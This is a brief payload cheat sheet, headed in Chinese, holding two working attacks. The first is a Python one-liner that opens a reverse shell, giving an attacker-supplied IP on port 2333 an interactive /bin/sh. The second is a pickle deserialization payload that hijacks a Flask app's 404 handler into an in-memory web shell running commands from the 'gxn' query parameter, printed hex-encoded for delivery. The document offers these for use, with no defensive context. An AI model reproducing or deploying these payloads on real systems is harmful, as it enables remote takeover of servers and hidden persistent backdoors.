# Payloads

## 无curl python出网反弹shell

```shell
python3 -c "import os
import socket
import subprocess
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('<Your IP>', 2333))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(['/bin/sh', '-i'])"
```

## 无curl不出网 flask内存马

```
import os
import pickle
import base64

class Poc():
    def __reduce__(self):
        return (exec,("global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('gxn')).read()",))

a = Poc()
b = pickle.dumps(a)

hex_output = b.hex()
print(hex_output)
```

